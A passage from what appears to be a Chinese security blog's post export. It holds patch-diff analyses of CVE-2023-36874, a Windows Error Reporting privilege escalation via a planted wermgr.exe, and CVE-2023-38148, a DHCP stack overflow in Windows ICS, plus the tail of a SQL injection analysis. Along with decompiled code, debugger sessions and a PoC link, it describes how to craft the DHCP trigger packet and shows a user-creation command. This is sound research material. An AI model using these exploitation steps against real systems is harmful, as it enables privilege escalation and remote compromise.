write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户密码不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户密码不可为空\u0026#39;); } //账号是否已存在 触发漏洞 $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); Created at 2023-09-20T10:04:31+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/","title":"CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。\n影响版本 略\n环境搭建 Windows 10 21H2 6月补丁 技术分析\u0026amp;调试 补丁对比 diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。\n对比发现补丁直接阻断了后续CAutoImpersonate::ImpersonateUserHighestPrivs和CWerComReport::_SubmitReport的调用\n//未修复 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } // 修复代码 __int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v11; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; if ( (unsigned __int8)wil::details::FeatureImpl\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::__private_IsEnabled(\u0026amp;`wil::Feature\u0026lt;__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport\u0026gt;::GetImpl\u0026#39;::`2\u0026#39;::impl) ) return 0x80004001i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v11 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v11 \u0026gt;= 0) ) { v11 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v11; } 根据函数名CAutoImpersonate::ImpersonateUserHighestPrivs可知，该函数为模拟用户最高的权限并提交report\n动态调试\n开启Problem Reports Control Panel Support服务，对应路径为C:\\Windows\\System32\\svchost.exe -k netsvcs -p。 使用oleviewdotnet查询Problem Reports Control Panel Support服务对应的ole信息\n对应的COM接口的CLSID为\nCLSID: 0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB AppID: 136A0DC7-DF5C-4271-A2AC-15DF1A1323F2 查看这个COM的接口信息 class __declspec(uuid(\u0026#34;6620c14b-70ae-4d4e-a4f6-91a7dcc582c2\u0026#34;)) IErcLuaSupport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStoreFactory** p0); }; class __declspec(uuid(\u0026#34;4904c154-426f-4c88-8ec2-4543d18670f7\u0026#34;)) IWerStoreFactory : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ IWerStore** p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ IWerStore** p0); }; class __declspec(uuid(\u0026#34;1e3a0e4f-1412-444f-8a94-fc6a09cd4195\u0026#34;)) IWerStore : public IUnknown { public: virtual HRESULT __stdcall Proc3(); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ IWerReport** p1); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); }; class __declspec(uuid(\u0026#34;d01b8f28-0bd1-4652-a415-8229f5ee506c\u0026#34;)) IWerReport : public IUnknown { public: virtual HRESULT __stdcall Proc3(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ IWerKeyValueList** p0); virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc10(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc11(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc12(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc13(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc14(/* Stack Offset: 8 */ IWerStringList** p0); virtual HRESULT __stdcall Proc15(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc16(/* Stack Offset: 8 */ struct Struct_1* p0); virtual HRESULT __stdcall Proc17(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc18(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc19(/* Stack Offset: 8 */ int64_t* p0); virtual HRESULT __stdcall Proc20(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc21(/* Stack Offset: 8 */ BSTR* p0); virtual HRESULT __stdcall Proc22(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ int64_t* p1, /* Stack Offset: 24 */ int64_t* p2, /* Stack Offset: 32 */ BSTR* p3, /* Stack Offset: 40 */ BSTR* p4); virtual HRESULT __stdcall Proc23(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ BSTR* p1); virtual HRESULT __stdcall Proc24(/* Stack Offset: 8 */ BSTR p0, /* Stack Offset: 16 */ int64_t p1, /* Stack Offset: 24 */ IWerReportSubmitCallback* p2, /* Stack Offset: 32 */ /* unique */BSTR* p3, /* Stack Offset: 40 */ /* unique */int64_t* p4); virtual HRESULT __stdcall Proc25(); }; 这里需要知道Windows的[[../../../05 Windows/COM模型/COM模型 OVERVIEW|COM模型)，COM模型定义了二进制标准，以支持组件复用。将操作系统API抽象成了接口，可以通过接口的标识符实例化COM对象并通过COM对象调用服务接口。即\n当使用COM接口调用error reporting 服务并提交错误报告时，error reporting会启动 C:\\Windows\\System32\\wermgr.exe，并且启动时权限为 NT AUTHORITY\\SYSTEM。 追溯调用栈 查看此事件的调用栈，wer!WerpAuxmdMapFile+0x3887d 处调用了CreateProcessW\nwer!WerpAuxmdMapFile+0x3887d位于 UtilLaunchWerManager函数内，代码如下\n__int64 __fastcall UtilLaunchWerManager( const unsigned __int16 **a1, __int64 a2, __int64 a3, void *a4, void **a5, void **a6, unsigned int a7, void **a8) { .... WCHAR Buffer[264]; // [rsp+148h] [rbp+40h] BYREF v43 = -2i64; v39 = a1; v8 = a5; lpValue = a8; memset_0(Buffer, 0, 0x208ui64); lpCommandLine[0] = 0i64; lpCommandLine[1] = 0i64; ..... goto LABEL_67; } v11 = StringCchCatW(Buffer, 0x104ui64, L\u0026#34;\\\\wermgr.exe\u0026#34;); v12 = v11; if ( v11 \u0026gt;= 0 ) { v12 = CString::Sprintf((CString *)lpCommandLine, L\u0026#34;\\\u0026#34;%s\\\u0026#34; \u0026#34;, Buffer); if ( (v12 \u0026amp; 0x80000000) != 0 ) { if ( WPP_GLOBAL_Control != (HKEY)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) != 0 ) { WPP_SF_S(*((_QWORD *)WPP_GLOBAL_Control + 2), 20i64, \u0026amp;WPP_80b9a2815f1633611b5141c011dbf465_Traceguids, Buffer); goto LABEL_37; } goto LABEL_38; } v13 = 0; v14 = lpCommandLine[0]; while ( v13 \u0026lt; 0xE ) { ..... v19 = CString::Append((CString *)lpCommandLine, v40[0]); if ( v19 \u0026gt;= 0 || WPP_GLOBAL_Control == (HKEY)\u0026amp;WPP_GLOBAL_Control || ((_BYTE)WPP_GLOBAL_Control[7] \u0026amp; 1) == 0 ) { v14 = lpCommandLine[0]; } .... if ( UpdateProcThreadAttribute(v10, 0, 0x20002ui64, lpValue, 8i64 * a7, 0i64, 0i64) ) { StartupInfo.cb = 112; v45 = v10; if ( CreateProcessW(Buffer, v14, 0i64, 0i64, 2, 0x80000u, 0i64, 0i64, \u0026amp;StartupInfo, \u0026amp;hObject) ) { v12 = 0; } ...... } 向上追溯调用栈，UtilLaunchWerManager函数由 CReportManager::ReportProblemOutOfProcess调用， 再上层函数为CReportManager::ReportProblem，CReportManager::ReportProblem由ReportHandleInstance::SubmitReport调用，在上层函数为WerpSubmitReportFromStore。在wecplsupport!DllCanUnloadNew+0x2bf2处调用了wer.dll!WerpSubmitReportFromStore函数。\nwercplsupport!DllCanUnloadNew+0x2bf2实际位于 wercplsupport!CWerComReport::_SubmitReport函数内，代码如下。\n__int64 __fastcall CWerComReport::_SubmitReport( void **this, unsigned __int16 *a2, unsigned int a3, struct IUnknown *a4, unsigned __int16 **a5, unsigned int *a6) { ...... v24 = \u0026amp;CStubUI::`vftable\u0026#39;; if ( a4 ) ((void (__fastcall *)(struct IUnknown *))a4-\u0026gt;lpVtbl-\u0026gt;AddRef)(a4); v25 = a4; v23[0] = 0i64; TokenHandle = 0i64; v26 = 0; v10 = a5; if ( a5 ) { SysFreeString(*a5); *v10 = 0i64; } WerApiLock = CWerApiAutoLock::TryGetWerApiLock((CWerApiAutoLock *)v23, (struct CWerComReport *)this); if ( WerApiLock \u0026gt;= 0 ) { ..... } else { CurrentThread = GetCurrentThread(); if ( OpenThreadToken(CurrentThread, 0xF01FFu, 1, \u0026amp;TokenHandle) || GetLastError() == 1008 ) { ..... } else { WerApiLock = WerpSubmitReportFromStore( *((void **)this[5] + 4), a2, this[4], (struct IReportUI *)((unsigned __int64)\u0026amp;v24 \u0026amp; -(__int64)(a4 != 0i64)), \u0026amp;v21, a3, (enum _WER_SUBMIT_RESULT *)\u0026amp;v20); ..... } _SubmitReport由 CWerComReport::SubmitReport调用，而 CWerComReport::SubmitReport为IWerReport接口公开的函数。\n__int64 __fastcall CWerComReport::SubmitReport( CWerComReport *this, unsigned __int16 *a2, unsigned int a3, struct IWerReportSubmitCallback *a4, unsigned __int16 **a5, unsigned int *a6) { int v10; // ebx int v12; // [rsp+30h] [rbp-18h] BYREF __int64 v13; // [rsp+38h] [rbp-10h] v13 = -2i64; v12 = 2; if ( !CAutoImpersonate::g_bEnableImpersonate || (v10 = CAutoImpersonate::ImpersonateUserHighestPrivs((CAutoImpersonate *)\u0026amp;v12), v10 \u0026gt;= 0) ) { v10 = CWerComReport::_SubmitReport((CWerComReport *)((char *)this - 24), a2, a3, a4, a5, a6); } CAutoImpersonate::~CAutoImpersonate((CAutoImpersonate *)\u0026amp;v12); return (unsigned int)v10; } 所以可以总结出调用链：wecplsupport!CWerComReport::SubmitReport-\u0026gt;wecplsupport!CWerComReport::_SubmitReport-\u0026gt;wer.dll!WerpSubmitReportFromStore...-\u0026gt;CreateProcessW\n问题在于在调用CreateProcessW时，CreateProcessW会使用攻击者设置的文件重定向，但将使用调用CreateProcessW的进程的security token设置进程的context，而不是模拟token来设置进程的security context。\n也就是攻击者可以通过文件重定向将 C:\\Windows\\System32重定向到攻击者可控目录，并且在可控目录写入恶意 wermgr.exe，当触发CreateProcessW时，CreateProcessW将使用攻击者控制的目录的wermgr.exe文件而不是系统在C:\\Windows\\System32目录下的wermgr.exe文件。并且该进程上下文继承了调用进程的上下文，即继承了wer服务的权限。\n动态调试 在 UtilLaunchWerManager断点\nbp wer!UtilLaunchWerManager 调试器断下\n0:006\u0026gt; g Breakpoint 2 hit wer!UtilLaunchWerManager+0xf3: 00007ffb`7b11a23f e87cb3f7ff call wer!StringCchCatW (00007ffb`7b0955c0) 0:006\u0026gt; rrcx rcx=00000041e2efbce0 补丁分析 前面知道补丁直接阻断了后续调用_submit，也就没办法再调用CreateProcess，从而阻断了调用链。\nPoC\nhttps://github.com/Wh04m1001/CVE-2023-36874 需要注意的是运行poc需要使用不在admin组的用户，新增用户运行\nnet user test 123456 /add 参考链接\nhttps://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/\nCreated at 2023-09-19T10:26:14+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/","title":"CVE-2023-38148 Windows Ics Rce分析","tags":["漏洞分析"],"description":"","content":"基本信息 依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖ipnathlp.dll\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess 漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。 服务调试参考第二个参考链接。\n影响版本 略\n环境搭建 参考 https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。\n技术分析\u0026amp;调试 静态分析 对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。\n在修复版本中在进行 if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u )判断之前先调用了 DumpDhcpHeaderInfo，在漏洞代码中先进行判断在调用DumpDhcpHeaderInfo 在修复版本中如果满足 if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) 则进入if内，在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。 可以看出 a2 + 230为_NH_BUFFER 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。\n所以漏洞应该是第二点所说的，产生在略过的逻辑中。\n// 未修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v12, 0, 0x40ui64); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( v4 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v4 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v4 + 25) \u0026gt;= 4u ) WPP_SF_dD( *((_QWORD *)v4 + 2), 97i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids, *((unsigned __int8 *)a2 + 230), 32); _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics); } DumpDhcpHeaderInfo(a2); // 修复代码 void __fastcall DhcpProcessMessage(struct _DHCP_INTERFACE *a1, struct _NH_BUFFER *a2) { ...... memset_0(\u0026amp;v11, 0, 0x40ui64); DumpDhcpHeaderInfo(a2); if ( *((_BYTE *)a2 + 230) \u0026gt; 0x20u ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_dd( *((_QWORD *)WPP_GLOBAL_Control + 2), 97i64, \u0026amp;WPP_df007ca3347434f5610fc5a17e95e0a3_Traceguids, *((unsigned __int8 *)a2 + 230), 32); } goto LABEL_10; } LABEL_10: _InterlockedIncrement((volatile signed __int32 *)\u0026amp;DhcpStatistics);// 这里多了调用 goto LABEL_11; ...... LABEL_11: EnterCriticalSection(\u0026amp;DhcpInterfaceLock); if ( *((int *)a1 + 19) \u0026lt; 0 ) { LeaveCriticalSection(\u0026amp;DhcpInterfaceLock); 略过的代码中，读取了a2参数的代码如下：\nif ( DhcpExtractOptionsFromMessage((struct _NH_BUFFER *)((char *)a2 + 228), *((_DWORD *)a2 + 55), \u0026amp;v11) ) ..... if ( !v12 ) { ..... DhcpProcessBootpMessage(a1, a2, \u0026amp;v11); goto LABEL_11; } ..... if ( DhcpIsLocalHardwareAddress((unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)) ) { .... } v7 = *(unsigned __int8 *)(v12 + 2); if ( v7 == 1 ) { ..... DhcpProcessDiscoverMessage(a1, a2, \u0026amp;v11); } else if ( *(_BYTE *)(v12 + 2) == 3 ) { ...... DhcpProcessRequestMessage(a1, a2, \u0026amp;v11); } ...... } if ( !DhcpArpForDad ) { v10 = *(_DWORD *)(v13 + 2); DhcpRemoveArpEntry(v10); DhcpCancelLease(v10, (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); ..... } else { if ( *(_BYTE *)(v12 + 2) != 7 ) { if ( *(_BYTE *)(v12 + 2) == 8 ) { ...... DhcpProcessInformMessage(a1, a2, \u0026amp;v11); } else { ...... } goto LABEL_11; } if ( !DhcpArpForDad ) { DhcpRemoveArpEntry(*((_DWORD *)a2 + 60)); DhcpCancelLease(*((_DWORD *)a2 + 60), (unsigned __int8 *)a2 + 256, *((unsigned __int8 *)a2 + 230)); } ...... } 查看这些函数代码，在 DhcpProcessBootpMessage函数中有如下逻辑\nvoid __fastcall DhcpProcessBootpMessage( v3 = a2; v5 = (char *)v3 + 228; ...... else { if ( !DhcpSendUnicastMessagesEnabled || v5[10] \u0026lt; 0 || DhcpAddArpEntry(v6, (unsigned __int8 *)v5 + 28, (unsigned __int8)v5[2], v23) )// 这个函数触发了漏洞 { // movzx r8d, byte ptr [r15+2] ; Size ... 前面知道 a2 + 230是长度字段，v5=v2+228，传入 DhcpAddArpEntry的size参数为v5+2，也就是a2 + 230 在 DhcpAddArpEntry函数中，Row为栈内结构体，memcpy传入的长度参数为a2 + 230，也就是补丁中判断的长度参数。 MIB_IPNET_ROW2结构体定义可以在\r这找到，其大小为0x58\n__int64 __fastcall DhcpAddArpEntry(DWORD a1, unsigned __int8 *Src, size_t Size, struct _DHCP_INTERFACE *a4) { MIB_IPNET_ROW2 Row; ...... v4 = (unsigned int)Size; ..... memset_0(\u0026amp;Row, 0, sizeof(Row)); Row.InterfaceIndex = DhcpAdapterIndex; Row.Address.Ipv4.sin_family = 2; Row.Address.Ipv4.sin_addr.S_un.S_addr = a1; Row.PhysicalAddressLength = v4; memcpy_0(Row.PhysicalAddress, Src, v4); ...... return v11; } } 所以漏洞触发路径为 DhcpProcessMessage-\u0026gt;DhcpProcessBootpMessage-\u0026gt;DhcpAddArpEntry-\u0026gt;memcpy_0，当长度参数过长时可以利用memcpy触发栈溢出。\n动态调试 使用windbg附加到svchost进程，在 ipnathlp!DhcpProcessMessage断点，而后触发DHCP请求，windbg在 ipnathlp!DhcpProcessMessage断下 由于不知道 DhcpProcessMessage的a2结构体定义，此处构造正常的DHCP请求，并在调试器中查看这个结构体成员信息。 单步运行到判断长度的地方，此时rsi指向传入的 _NH_BUFFER结构体，\n0:004\u0026gt; u ipnathlp!DhcpProcessMessage+0x7f: 00007ff9`c00176f3 488dbee4000000 lea rdi,[rsi+0E4h] 00007ff9`c00176fa 41b604 mov r14b,4 00007ff9`c00176fd 807f0220 cmp byte ptr [rdi+2],20h 00007ff9`c0017701 7636 jbe ipnathlp!DhcpProcessMessage+0xc5 (00007ff9`c0017739) 00007ff9`c0017703 493bdc cmp rbx,r12 00007ff9`c0017706 742a je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) 00007ff9`c0017708 44847b1c test byte ptr [rbx+1Ch],r15b 00007ff9`c001770c 7424 je ipnathlp!DhcpProcessMessage+0xbe (00007ff9`c0017732) 可以在调试器内看到 (_BYTE *)a2 + 230)值为6\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 而该处数据来源于DHCP客户端发送的DHCP请求，在wireshark中可以看到数据包中刚好有长度字段值为6，说明(_BYTE *)a2 + 230)处有可能是数据包内的Hardware address length。\n此时调用栈：\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x86 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 此时尝试手动将(_BYTE *)a2 + 230)修改为0xfe，继续运行，但没有触发异常。\n0:004\u0026gt; db rdi+2 00000203`faa1fdb6 06 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:004\u0026gt; eb rdi+2 fe 0:004\u0026gt; db rdi+2 00000203`faa1fdb6 fe 00 1a cc 8a 61 00 00-80 00 00 00 00 00 00 00 .....a.......... 00000203`faa1fdc6 00 00 00 00 00 00 00 00-00 00 00 0c 29 c2 3a 42 ............).:B 00000203`faa1fdd6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fde6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fdf6 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe06 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe16 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 00000203`faa1fe26 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................ 0:002\u0026gt; g Breakpoint 0 hit ipnathlp!DhcpProcessMessage: 00007ff9`c0017674 48895c2418 mov qword ptr [rsp+18h],rbx ss:0000000e`346ff630=00000203faa7e350 改为单步调试，再次发起DHCP请求，发现没有进入到漏洞函数 DhcpProcessBootpMessage中，原因是v13不为0，条件不成立，不会调用 DhcpProcessBootpMessage\nif ( !v13 ) { if ( WPP_GLOBAL_Control != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)WPP_GLOBAL_Control + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)WPP_GLOBAL_Control + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)WPP_GLOBAL_Control + 2), 98i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); } DhcpProcessBootpMessage(a1, a2, \u0026amp;v12); // 这里触发漏洞 goto LABEL_25; } 对v13下写断点\n0:004\u0026gt; ba w1 rsp+0x38 0:004\u0026gt; g Breakpoint 6 hit msvcrt!memset+0x35: 00007ff9`ed1046b5 4983e908 sub r9,8 触发断点，此时调用栈如下，对应代码为 memset_0(a3, 0, 0x40ui64);\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f418 00007ff9`c0015b63 msvcrt!memset+0x35 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x7b 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 此处将目标内存清零，不符合前面说的条件，继续运行，再次触发写断，调用栈为\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f420 00007ff9`c0017754 ipnathlp!DhcpExtractOptionsFromMessage+0x428 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0xe0 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 对应在DhcpExtractOptionsFromMessage的代码如下，当OptionID为0x35时进入case语句内\nv9 = (struct _DHCP_OPTION *)((char *)a1 + 240); OptionID = v9-\u0026gt;OptionID; if ( OptionID ) { switch ( OptionID ) case 0x35u: if ( v6 != (CInterfaceMonitor *)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (*((_BYTE *)v6 + 28) \u0026amp; 2) != 0 \u0026amp;\u0026amp; *((_BYTE *)v6 + 25) \u0026gt;= 4u ) { WPP_SF_(*((_QWORD *)v6 + 2), 44i64, \u0026amp;WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids); v6 = WPP_GLOBAL_Control; } if ( BYTE1(v9-\u0026gt;OptionID) ) { a3[1] = v9; } _DHCP_OPTION结构体定义如下，对应于DHCP请求内的option\ntypedef DWORD DHCP_OPTION_ID; struct _DHCP_OPTION { DHCP_OPTION_ID OptionID; LPWSTR OptionName; LPWSTR OptionComment; DHCP_OPTION_DATA DefaultValue; DHCP_OPTION_TYPE OptionType; }; 0:002\u0026gt; db rdi 00000203`faa1fea4 35 01 03 3d 07 01 00 0c-29 c2 3a 42 32 04 c0 a8 5..=....).:B2... 00000203`faa1feb4 89 cd 0c 0f 44 45 53 4b-54 4f 50 2d 54 35 50 37 ....DESKTOP-T5P7 00000203`faa1fec4 34 45 53 51 12 00 00 00-44 45 53 4b 54 4f 50 2d 4ESQ....DESKTOP- 00000203`faa1fed4 54 35 50 37 34 45 53 3c-08 4d 53 46 54 20 35 2e T5P74ES\u0026lt;.MSFT 5. 00000203`faa1fee4 30 37 0e 01 03 06 0f 1f-21 2b 2c 2e 2f 77 79 f9 07......!+,./wy. 根据RFC rfc2132 option 53为传递DHCP消息类型，第一个字节是操作编号，第二个字节恒为1，第三个字节是消息类型，范围是1-9 根据代码，当DHCP中含有option 53一定会进入 DhcpExtractOptionsFromMessage的 if ( BYTE1(v9-\u0026gt;OptionID) )，把a3[1]赋值为不为零的值。 回到DhcpProcessMessage内，v13就不为0，不能进入触发漏洞的逻辑 重新构造DHCP数据包,，删除option53并将 Hardware address length改为100，单步调试，成功进入到 DhcpAddArpEntry函数内。\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f2a0 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x14a 0000000e`3487f380 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 